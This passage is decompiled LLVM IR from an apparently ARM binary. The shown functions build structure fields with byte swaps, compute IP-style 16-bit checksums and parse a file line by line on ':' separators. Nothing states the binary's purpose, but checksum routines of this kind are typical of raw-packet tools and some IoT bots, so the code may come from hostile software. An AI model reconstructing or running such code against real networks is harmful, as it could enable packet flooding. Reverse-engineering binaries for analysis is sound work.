  %v3_c720 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c720, i32* %r3.global-to-local, align 4
  %v1_c724 = add i32 %v3_c720, 1
  store i32 %v1_c724, i32* %r0.global-to-local, align 4
  %v1_c728 = load i32, i32* @r7, align 4
  %v9_c728 = icmp eq i32 %v1_c724, %v1_c728
  store i1 %v9_c728, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c724, i32* %stack_var_-44, align 4
  %v5_c730 = icmp slt i32 %v1_c724, %v1_c728
  br i1 %v5_c730, label %dec_label_pc_c638, label %dec_label_pc_c734

dec_label_pc_c734:                                ; preds = %dec_label_pc_c6b0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c738 = icmp eq i32 %v1_c728, 0
  store i1 %v2_c738, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c738, label %dec_label_pc_c624, label %dec_label_pc_c634

dec_label_pc_c748:                                ; preds = %dec_label_pc_c638
  %v1_c748 = add i32 %v2_c640, 16
  %v2_c748 = inttoptr i32 %v1_c748 to i32*
  %v3_c748 = load i32, i32* %v2_c748, align 4
  store i32 %v3_c748, i32* %r4.global-to-local, align 4
  %v0_c74c = call i32 @function_e0d0()
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  %v3_c750 = load i32, i32* %stack_var_-44, align 4
  %v5_c758 = mul i32 %v3_c750, 24
  %v0_c75c = load i32, i32* %r4.global-to-local, align 4
  %v1_c75c = and i32 %v0_c75c, 16711680
  %v3_c760 = udiv i32 %v0_c75c, 16777216
  %v4_c764 = udiv i32 %v1_c75c, 256
  %v5_c764 = or i32 %v4_c764, %v3_c760
  store i32 %v5_c764, i32* %r2.global-to-local, align 4
  %v1_c768 = load i32, i32* @r8, align 4
  %v2_c768 = add i32 %v1_c768, %v5_c758
  store i32 %v2_c768, i32* %r1.global-to-local, align 4
  %v1_c76c = and i32 %v0_c75c, 65280
  store i32 %v1_c76c, i32* %r3.global-to-local, align 4
  %v1_c770 = add i32 %v2_c768, 20
  %v2_c770 = inttoptr i32 %v1_c770 to i8*
  %v3_c770 = load i8, i8* %v2_c770, align 1
  %v4_c770 = zext i8 %v3_c770 to i32
  %v5_c778 = call i32 @llvm.bswap.i32(i32 %v0_c75c)
  %v7_c77c = lshr i32 %v0_c74c, %v4_c770
  %v8_c77c = add i32 %v7_c77c, %v5_c778
  store i32 %v8_c77c, i32* %r2.global-to-local, align 4
  %v1_c780 = and i32 %v8_c77c, 16711680
  store i32 %v1_c780, i32* %r0.global-to-local, align 4
  %v1_c78c = and i32 %v8_c77c, 65280
  store i32 %v1_c78c, i32* %r1.global-to-local, align 4
  %v5_c794 = call i32 @llvm.bswap.i32(i32 %v8_c77c)
  %v1_c798 = load i32, i32* @r5, align 4
  %v2_c798 = add i32 %v1_c798, 16
  %v3_c798 = inttoptr i32 %v2_c798 to i32*
  store i32 %v5_c794, i32* %v3_c798, align 4
  store i32 %v6_c34c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7a0, label %dec_label_pc_c7a8, label %dec_label_pc_c664

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c748, %dec_label_pc_c658
  %v0_c7a8 = call i32 @function_e0d0()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7b0 = load i32, i32* @r5, align 4
  %v2_c7b0 = add i32 %v1_c7b0, 12
  %v3_c7b0 = inttoptr i32 %v2_c7b0 to i32*
  store i32 %v0_c7a8, i32* %v3_c7b0, align 4
  store i32 %v3_c3b4, i32* %r0.global-to-local, align 4
  %v0_c7b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7b8 = add i32 %v0_c7b8, -1
  store i32 %v1_c7b8, i32* @r4, align 4
  %v9_c7bc = icmp eq i32 %v3_c3b4, %v1_c7b8
  store i1 %v9_c7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7bc, label %dec_label_pc_c7c4, label %dec_label_pc_c678

dec_label_pc_c7c4:                                ; preds = %dec_label_pc_c7a8, %dec_label_pc_c664
  %v0_c7c4 = call i32 @function_e0d0()
  %v1_c7c4 = trunc i32 %v0_c7c4 to i16
  store i32 %v0_c7c4, i32* %r0.global-to-local, align 4
  store i32 %v3_c3b8, i32* %r1.global-to-local, align 4
  %v1_c7cc = load i32, i32* @r4, align 4
  %v9_c7cc = icmp eq i32 %v3_c3b8, %v1_c7cc
  store i1 %v9_c7cc, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d0 = load i32, i32* @r5, align 4
  %v4_c7d0 = add i32 %v3_c7d0, 4
  %v5_c7d0 = inttoptr i32 %v4_c7d0 to i16*
  store i16 %v1_c7c4, i16* %v5_c7d0, align 2
  br i1 %v9_c7cc, label %dec_label_pc_c7d8, label %dec_label_pc_c7c4.dec_label_pc_c684_crit_edge

dec_label_pc_c7c4.dec_label_pc_c684_crit_edge:    ; preds = %dec_label_pc_c7c4
  %v1_c688.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c684

dec_label_pc_c7d8:                                ; preds = %dec_label_pc_c7c4, %dec_label_pc_c678
  %v0_c7d8 = call i32 @function_e0d0()
  %v1_c7d8 = trunc i32 %v0_c7d8 to i16
  store i32 %v0_c7d8, i32* %r0.global-to-local, align 4
  store i32 %v3_c3bc, i32* %r2.global-to-local, align 4
  %v1_c7e0 = load i32, i32* @r4, align 4
  %v9_c7e0 = icmp eq i32 %v3_c3bc, %v1_c7e0
  store i1 %v9_c7e0, i1* %cpsr_z.global-to-local, align 1
  %v3_c7e4 = load i32, i32* @r5, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7d8, i16* %v5_c7e4, align 2
  br i1 %v9_c7e0, label %dec_label_pc_c7ec, label %dec_label_pc_c7d8.dec_label_pc_c690_crit_edge

dec_label_pc_c7d8.dec_label_pc_c690_crit_edge:    ; preds = %dec_label_pc_c7d8
  %v1_c694.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c690

dec_label_pc_c7ec:                                ; preds = %dec_label_pc_c7d8, %dec_label_pc_c684
  %v0_c7ec = call i32 @function_e0d0()
  %v1_c7ec = trunc i32 %v0_c7ec to i16
  store i32 %v0_c7ec, i32* %r0.global-to-local, align 4
  store i32 %v5_c288, i32* %r3.global-to-local, align 4
  %v1_c7f4 = load i32, i32* @r4, align 4
  %v9_c7f4 = icmp eq i32 %v5_c288, %v1_c7f4
  store i1 %v9_c7f4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7f8 = load i32, i32* @r6, align 4
  %v4_c7f8 = add i32 %v3_c7f8, 2
  %v5_c7f8 = inttoptr i32 %v4_c7f8 to i16*
  store i16 %v1_c7ec, i16* %v5_c7f8, align 2
  br i1 %v9_c7f4, label %dec_label_pc_c800, label %dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge

dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge:    ; preds = %dec_label_pc_c7ec
  %v1_c6a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c69c

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7ec, %dec_label_pc_c690
  %v0_c800 = call i32 @function_e0d0()
  %v1_c804 = load i32, i32* @r6, align 4
  %v2_c804 = add i32 %v1_c804, 4
  %v3_c804 = inttoptr i32 %v2_c804 to i32*
  store i32 %v0_c800, i32* %v3_c804, align 4
  store i32 %v6_c2a0, i32* %r0.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v6_c2a0, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c80c, label %dec_label_pc_c814, label %dec_label_pc_c6a8

dec_label_pc_c814:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c69c
  %v0_c814 = call i32 @function_e0d0()
  store i32 %v0_c814, i32* %r0.global-to-local, align 4
  %v0_c818 = load i32, i32* @fp, align 4
  %v2_c818 = icmp eq i32 %v0_c818, 0
  store i1 %v2_c818, i1* %cpsr_z.global-to-local, align 1
  %v1_c81c = load i32, i32* @r6, align 4
  %v2_c81c = add i32 %v1_c81c, 8
  %v3_c81c = inttoptr i32 %v2_c81c to i32*
  store i32 %v0_c814, i32* %v3_c81c, align 4
  br i1 %v2_c818, label %dec_label_pc_c6b0, label %dec_label_pc_c824

dec_label_pc_c824:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c814
  %v0_c824 = call i32 @function_e0d0()
  %v1_c824 = trunc i32 %v0_c824 to i16
  store i32 %v0_c824, i32* %r0.global-to-local, align 4
  %v3_c828 = load i32, i32* @r6, align 4
  %v4_c828 = add i32 %v3_c828, 18
  %v5_c828 = inttoptr i32 %v4_c828 to i16*
  store i16 %v1_c824, i16* %v5_c828, align 2
  br label %dec_label_pc_c6b0

dec_label_pc_c830:                                ; preds = %dec_label_pc_c370
  %v0_c830 = load i32, i32* @sl, align 4
  store i32 %v0_c830, i32* %r0.global-to-local, align 4
  %v1_c834 = call i32 @function_1130c(i32 %v0_c830)
  store i32 %v1_c834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c838

dec_label_pc_c838:                                ; preds = %dec_label_pc_c19c, %dec_label_pc_c830
  %v1_c840 = phi i32 [ %v3_c360, %dec_label_pc_c19c ], [ %v1_c834, %dec_label_pc_c830 ]
  store i32 %v3_c19c, i32* %r4.global-to-local, align 4
  store i32 %v24_c19c, i32* %fp.global-to-local, align 4
  store i32 %v27_c19c, i32* %lr.global-to-local, align 4
  ret i32 %v1_c840

; uselistorder directives
  uselistorder i32 %v0_c824, { 1, 0 }
  uselistorder i32 %v0_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7d8, { 1, 0 }
  uselistorder i32 %v0_c7c4, { 1, 0 }
  uselistorder i32 %v1_c7b8, { 1, 2, 0 }
  uselistorder i32 %v0_c75c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c724, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c6f0, { 1, 0 }
  uselistorder i32 %v4_c6e0, { 1, 0 }
  uselistorder i1 %v3_c670, { 1, 0 }
  uselistorder i32 %v2_c614, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c47c, { 1, 2, 0 }
  uselistorder i32 %v1_c448, { 2, 1, 0 }
  uselistorder i32 %v1_c444, { 2, 0, 1 }
  uselistorder i32 %v1_c440, { 2, 0, 1 }
  uselistorder i32 %v1_c43c, { 2, 0, 1 }
  uselistorder i32 %v1_c418, { 1, 0 }
  uselistorder i32 %v3_c3b4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3a8, { 1, 0, 2 }
  uselistorder i32 %v0_c3a4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c390, { 1, 0 }
  uselistorder i1 %v7_c364, { 1, 0 }
  uselistorder i32 %v3_c360, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c34c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2a0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c288, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c20c, { 1, 0 }
  uselistorder i32 %v7_c1f4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_8570, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 95, 96, 97, 98, 99, 100, 101, 102, 91, 92, 93, 94, 103, 104, 105, 106 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c838, { 1, 0 }
  uselistorder label %dec_label_pc_c824, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c634, { 1, 0 }
  uselistorder label %dec_label_pc_c624, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_c848(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c848:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c86c, label %dec_label_pc_c854

dec_label_pc_c854:                                ; preds = %dec_label_pc_c848
  %v0_c85c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c858

dec_label_pc_c858:                                ; preds = %dec_label_pc_c858, %dec_label_pc_c854
  %v0_c864 = phi i32 [ %v2_c864, %dec_label_pc_c858 ], [ 0, %dec_label_pc_c854 ]
  %v0_c85c = phi i32 [ %v5_c85c, %dec_label_pc_c858 ], [ %v0_c85c.pre, %dec_label_pc_c854 ]
  %v0_c858 = phi i32 [ %v1_c858, %dec_label_pc_c858 ], [ %arg1, %dec_label_pc_c854 ]
  %v1_c858 = add i32 %v0_c858, -2
  %v1_c85c = inttoptr i32 %v0_c85c to i16*
  %v2_c85c = load i16, i16* %v1_c85c, align 2
  %v3_c85c = zext i16 %v2_c85c to i32
  %v5_c85c = add i32 %v0_c85c, -2
  store i32 %v5_c85c, i32* @r0, align 4
  %v2_c864 = add i32 %v3_c85c, %v0_c864
  %v1_c858.cmp = icmp ugt i32 %v1_c858, 1
  br i1 %v1_c858.cmp, label %dec_label_pc_c858, label %dec_label_pc_c86c.loopexit

dec_label_pc_c86c.loopexit:                       ; preds = %dec_label_pc_c858
  br label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c848, %dec_label_pc_c86c.loopexit
  %v1_c874 = phi i32 [ %v2_c864, %dec_label_pc_c86c.loopexit ], [ 0, %dec_label_pc_c848 ]
  %v0_c86c = phi i32 [ %v1_c858, %dec_label_pc_c86c.loopexit ], [ %arg1, %dec_label_pc_c848 ]
  %v7_c86c = icmp eq i32 %v0_c86c, 1
  br i1 %v7_c86c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c86c
  %v1_c870 = load i32, i32* @r0, align 4
  %v2_c870 = inttoptr i32 %v1_c870 to i8*
  %v3_c870 = load i8, i8* %v2_c870, align 1
  %v4_c870 = zext i8 %v3_c870 to i32
  %v3_c874 = add i32 %v1_c874, %v4_c870
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c86c, %bb
  %v0_c878 = phi i32 [ %v1_c874, %dec_label_pc_c86c ], [ %v3_c874, %bb ]
  %v3_c87c = urem i32 %v0_c878, 65536
  %v4_c880 = udiv i32 %v0_c878, 65536
  %v5_c880 = add nuw nsw i32 %v4_c880, %v3_c87c
  %v4_c884 = udiv i32 %v5_c880, 65536
  %v5_c884 = add nuw nsw i32 %v4_c884, %v5_c880
  %v1_c888 = urem i32 %v5_c884, 65536
  %v3_c890 = xor i32 %v1_c888, 65535
  ret i32 %v3_c890

; uselistorder directives
  uselistorder i32 %v5_c880, { 1, 0 }
  uselistorder i32 %v5_c85c, { 1, 0 }
  uselistorder i32 %v1_c858, { 1, 0, 2 }
  uselistorder i32 %v0_c85c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c86c, { 1, 0 }
}

define i32 @function_c898(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c898:
  %v1_c8a8 = add i32 %arg1, 12
  %v2_c8a8 = inttoptr i32 %v1_c8a8 to i32*
  %v3_c8a8 = load i32, i32* %v2_c8a8, align 4
  %v1_c8ac = add i32 %arg1, 16
  %v2_c8ac = inttoptr i32 %v1_c8ac to i32*
  %v3_c8ac = load i32, i32* %v2_c8ac, align 4
  %v7_c8b0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8b0, label %dec_label_pc_c8bc.preheader, label %dec_label_pc_c8d0

dec_label_pc_c8bc.preheader:                      ; preds = %dec_label_pc_c898
  %v0_c8c0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8bc

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c8bc.preheader, %dec_label_pc_c8bc
  %v0_c8c8 = phi i32 [ 0, %dec_label_pc_c8bc.preheader ], [ %v2_c8c8, %dec_label_pc_c8bc ]
  %v0_c8c0 = phi i32 [ %v0_c8c0.pre, %dec_label_pc_c8bc.preheader ], [ %v5_c8c0, %dec_label_pc_c8bc ]
  %v0_c8bc = phi i32 [ %arg3, %dec_label_pc_c8bc.preheader ], [ %v1_c8bc, %dec_label_pc_c8bc ]
  %v1_c8bc = add nsw i32 %v0_c8bc, -2
  %v1_c8c0 = inttoptr i32 %v0_c8c0 to i16*
  %v2_c8c0 = load i16, i16* %v1_c8c0, align 2
  %v3_c8c0 = zext i16 %v2_c8c0 to i32
  %v5_c8c0 = add i32 %v0_c8c0, -2
  store i32 %v5_c8c0, i32* @r1, align 4
  %v2_c8c8 = add i32 %v3_c8c0, %v0_c8c8
  %v8_c8cc = icmp sgt i32 %v1_c8bc, 1
  br i1 %v8_c8cc, label %dec_label_pc_c8bc, label %dec_label_pc_c8d0.loopexit

dec_label_pc_c8d0.loopexit:                       ; preds = %dec_label_pc_c8bc
  br label %dec_label_pc_c8d0

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c8d0.loopexit, %dec_label_pc_c898
  %v1_c8dc = phi i32 [ %v2_c8c8, %dec_label_pc_c8d0.loopexit ], [ 0, %dec_label_pc_c898 ]
  %v0_c8d0 = phi i32 [ %v1_c8bc, %dec_label_pc_c8d0.loopexit ], [ %arg3, %dec_label_pc_c898 ]
  %v7_c8d0 = icmp eq i32 %v0_c8d0, 1
  br i1 %v7_c8d0, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c8d0
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c8d0
  %v1_c8d4 = load i32, i32* @r1, align 4
  %v2_c8d4 = inttoptr i32 %v1_c8d4 to i8*
  %v3_c8d4 = load i8, i8* %v2_c8d4, align 1
  %v4_c8d4 = zext i8 %v3_c8d4 to i32
  %v3_c8dc = add i32 %v4_c8d4, %v1_c8dc
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c904 = phi i32 [ %v1_c8dc, %.thread ], [ %v3_c8dc, %bb ]
  %v0_c8e4 = mul i32 %v3_c8a8, 65536
  %v3_c8e4 = udiv i32 %v0_c8e4, 65536
  %v3_c8e8 = urem i32 %v3_c8ac, 65536
  %v4_c8f0 = udiv i32 %v3_c8a8, 65536
  %v2_c8ec = add nuw nsw i32 %v3_c8e8, %v4_c8f0
  %v5_c8f0 = add nuw nsw i32 %v2_c8ec, %v3_c8e4
  %v1_c8f4 = add i32 %arg1, 9
  %v2_c8f4 = inttoptr i32 %v1_c8f4 to i8*
  %v3_c8f4 = load i8, i8* %v2_c8f4, align 1
  %v4_c8f4 = zext i8 %v3_c8f4 to i32
  %v4_c8f8 = udiv i32 %v3_c8ac, 65536
  %v3_c900 = mul nuw nsw i32 %v4_c8f4, 256
  %v5_c8f8 = add i32 %v4_c8f8, %arg2
  %v2_c8fc = add i32 %v5_c8f8, %v1_c904
  %v2_c904 = add i32 %v2_c8fc, %v5_c8f0
  %v2_c908 = add i32 %v2_c904, %v3_c900
  %tmp = icmp ult i32 %v2_c908, 65536
  br i1 %tmp, label %dec_label_pc_c928, label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb19, %dec_label_pc_c914
  %v2_c91c5 = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206.in = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206 = udiv i32 %v3_c9206.in, 65536
  %v3_c918 = urem i32 %v2_c91c5, 65536
  %v2_c91c = add nuw nsw i32 %v3_c918, %v3_c9206
  %tmp20 = icmp ult i32 %v2_c91c, 65536
  br i1 %tmp20, label %dec_label_pc_c928.loopexit, label %dec_label_pc_c914

dec_label_pc_c928.loopexit:                       ; preds = %dec_label_pc_c914
  br label %dec_label_pc_c928

dec_label_pc_c928:                                ; preds = %dec_label_pc_c928.loopexit, %bb19
  %v0_c928 = phi i32 [ %v2_c91c, %dec_label_pc_c928.loopexit ], [ %v2_c908, %bb19 ]
  %v1_c928 = urem i32 %v0_c928, 65536
  %v3_c930 = xor i32 %v1_c928, 65535
  ret i32 %v3_c930

; uselistorder directives
  uselistorder i32 %v2_c91c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c908, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c8dc, { 1, 0 }
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v0_c8c0, { 1, 0 }
  uselistorder i32 %v3_c8a8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8bc, { 1, 0 }
}

define i32 @function_c93c(i32 %arg1) local_unnamed_addr {
dec_label_pc_c93c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c93c = load i32, i32* @r4, align 4
  %v6_c93c = load i32, i32* @r5, align 4
  %v9_c93c = load i32, i32* @r6, align 4
  %v12_c93c = load i32, i32* @r7, align 4
  %v15_c93c = load i32, i32* @r8, align 4
  %v18_c93c = load i32, i32* @sb, align 4
  %v21_c93c = load i32, i32* @sl, align 4
  %v24_c93c = load i32, i32* @fp, align 4
  %v27_c93c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c958 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c958, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_c984 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c984, i32* @fp, align 4
  %v3_c990 = call i32 @function_11790(i8* nonnull %stack_var_-585, i32 0)
  %v2_c994 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c994, i32* @sl, align 4
  %v0_c998 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9a4 = bitcast i32* %stack_var_-8777 to i8*
  %v3_c9a4 = call i32 @function_11790(i8* %v2_c9a4, i32 %v0_c998)
  %v0_c9ac = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9b8 = bitcast i32* %stack_var_-4681 to i8*
  %v3_c9b8 = call i32 @function_11790(i8* %v2_c9b8, i32 %v0_c9ac)
  %v2_c9bc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9bc, i32* @sb, align 4
  %v0_c9c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c9c0 = udiv i32 %v0_c9c0, 256
  %v1_c9c4 = urem i32 %v0_c9c0, 256
  store i32 %v1_c9c4, i32* @r4, align 4
  %v3_c9d4 = trunc i32 %v3_c9c0 to i8
  %v4_c9d4 = call i32 @function_10cac(i8 %v3_c9d4, i32 16, i32 %v2_c9bc)
  %v2_c9dc = call i32 @function_1084c(i8* nonnull %stack_var_-72)
  %v7_c9e0 = icmp eq i32 %v2_c9dc, 2
  br i1 %v7_c9e0, label %dec_label_pc_cea4, label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c93c, %dec_label_pc_cea4
  %v1_c9ec = call i32 @function_1030c(i32 13)
  %v1_c9f4 = call i32 @function_1030c(i32 14)
  %v1_c9fc = call i32 @function_1030c(i32 15)
  %v1_ca04 = call i32 @function_1030c(i32 17)
  %v0_ca08 = load i32, i32* @r5, align 4
  %v2_ca10 = inttoptr i32 %v0_ca08 to i32*
  %v3_ca10 = call i32 @function_10248(i32 17, i32* %v2_ca10)
  %v0_ca14 = load i32, i32* @r5, align 4
  %v2_ca18 = call i32 @function_10f18(i32 %v3_ca10, i32 %v0_ca14)
  %v7_ca1c = icmp eq i32 %v2_ca18, -1
  store i32 %v2_ca18, i32* @r8, align 4
  br i1 %v7_ca1c, label %bb, label %dec_label_pc_ca2c.preheader

bb:                                               ; preds = %dec_label_pc_c9e8
  %v1_ca24 = load i32, i32* @r5, align 4
  store i32 %v1_ca24, i32* @r4, align 4
  br label %dec_label_pc_ce40

dec_label_pc_ca2c.preheader:                      ; preds = %dec_label_pc_c9e8
  %v4_ca3856 = call i32 @function_10aac(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca18)
  %v2_ca3c58 = icmp eq i32 %v4_ca3856, 0
  br i1 %v2_ca3c58, label %dec_label_pc_cbc4.loopexit, label %dec_label_pc_ca44.lr.ph

dec_label_pc_ca44.lr.ph:                          ; preds = %dec_label_pc_ca2c.preheader
  %v2_ca8c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca44.lr.ph, %dec_label_pc_ca2c.backedge
  %v3_ca48 = load i8, i8* %stack_var_-585, align 1
  %v4_ca48 = sext i8 %v3_ca48 to i32
  %v2_ca4c = icmp eq i8 %v3_ca48, 0
  br i1 %v2_ca4c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca44
  %v8_ca50 = icmp eq i8 %v3_ca48, 58
  br i1 %v8_ca50, label %.thread8, label %dec_label_pc_ca64

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_ca7c

bb126:                                            ; preds = %dec_label_pc_ca44
  br label %dec_label_pc_ca7c

dec_label_pc_ca64:                                ; preds = %bb125
  %v1_ca6c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca68:                                ; preds = %bb127, %dec_label_pc_ca64
  %v0_ca68 = phi i32 [ %v1_ca68, %bb127 ], [ 0, %dec_label_pc_ca64 ]
  %v1_ca68 = add i32 %v0_ca68, 1
  %v2_ca6c = add i32 %v1_ca68, %v1_ca6c.pre
  %v3_ca6c = inttoptr i32 %v2_ca6c to i8*
  %v4_ca6c = load i8, i8* %v3_ca6c, align 1
  %v6_ca6c = zext i8 %v4_ca6c to i32
  %v2_ca70 = icmp eq i8 %v4_ca6c, 0
  br i1 %v2_ca70, label %dec_label_pc_ca7c, label %bb127

bb127:                                            ; preds = %dec_label_pc_ca68
  %v8_ca74 = icmp eq i8 %v4_ca6c, 58
  br i1 %v8_ca74, label %dec_label_pc_ca7c, label %dec_label_pc_ca68

dec_label_pc_ca7c:                                ; preds = %dec_label_pc_ca68, %bb127, %bb126, %.thread8
  %v1_caa8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_ca68, %bb127 ], [ %v1_ca68, %dec_label_pc_ca68 ]
  %v0_ca7c = phi i32 [ %v4_ca48, %.thread8 ], [ %v4_ca48, %bb126 ], [ %v6_ca6c, %bb127 ], [ %v6_ca6c, %dec_label_pc_ca68 ]
  %v2_ca7c = icmp eq i32 %v0_ca7c, 0
  br i1 %v2_ca7c, label %dec_label_pc_ca2c.backedge, label %dec_label_pc_ca84

dec_label_pc_ca2c.backedge:                       ; preds = %dec_label_pc_ca7c, %dec_label_pc_cb4c, %dec_label_pc_cb98, %dec_label_pc_cac8
  %v0_ca34 = load i32, i32* @r8, align 4
  %v4_ca38 = call i32 @function_10aac(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca34)
  %v2_ca3c = icmp eq i32 %v4_ca38, 0
